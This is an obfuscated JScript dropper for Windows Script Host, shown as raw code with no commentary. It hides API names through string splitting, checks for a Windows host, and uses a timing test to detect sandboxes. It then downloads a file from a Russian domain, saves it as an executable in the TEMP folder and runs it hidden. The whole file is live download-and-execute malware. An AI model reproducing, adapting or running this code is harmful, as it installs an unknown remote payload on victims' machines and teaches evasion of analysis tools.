var K0 = false;
var Z0 = "Create"+"Object";
var BI = function CK() {return WScript[Z0]("WScript"+".Shell");}(), H = 11;
var SA = "MSXML2"+".XMLHTTP";
var F0 = 2;
var YX = F0 - 2;
function B(G){BI["Run"](G, YX, YX);};
function XO(){return SA + "";};
function NK(X, Y0){YX = YX * 1; return X - Y0;};
function D(){return Z0;};
/*@cc_on
  @if (@_win32 || @_win64)
    K0 = true;
  @end
@*/
if (K0)
{
var DW = "";
function R(){return 22;};
var OL = 0; var I = 0;
function BA()
{
var GV = new this["Date"]();
var C = GV["getUTCMilliseconds"]();
WScript["Sleep"](R());
var GV = new this["Date"]();
var XY = GV["getUTCMilliseconds"]();
WScript["Sleep"](R());
var GV = new this["Date"]();
var S0 = GV["getUTCMilliseconds"]();
var OL = "S";
OL = NK(XY, C);
var I = "D0";
I = NK(S0, XY);
DW = "open";
return NK(OL, I);
}
var Y = false;
var BV = false;
for (var N = YX; N < R() * 1; N++){if (BA() != YX){
Y = true; 
I = "31" + 11 * OL + I; 
BV = true; 
break;
}}
function JN() {return ((Y == true) && (Y == BV)) ? 1 : YX;};
if (Y && JN() && BV){
function Z() {return BI["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "c66DYhgdKHCiM.ex" + "e";};
 J = XO();
 V0 = WScript[Z0](J);
 var AE = 1;
do { 
	for (;AE;){
	try {
		if (AE == 1)
		{
			V0[DW]("GET", "http://bigmishki.ru/l3osjf", false);
			V0["send"]();
			F = "Sleep";
			AE = 2;
		}
		WScript[F](R() + 120); 
		if (V0["readystate"] < 2 * 2) continue;
		AE = YX;
		function K(V) {var GX = (1, 2, 3, 4, 5, V); return GX;};
		I0 = WScript[D()]("ADODB.Stream");
		J = I0;
		J[DW]();
		J["type"] = K(1);
		J["write"](V0["ResponseBody"]);
		I0["position"] = K(YX);
		J["Save" + "ToFile"](Z(), 2);
		I0["cl"+"ose"]();
		VX = Z();
		B(VX);
	} catch(AD){};};
}while (AE);
}
}

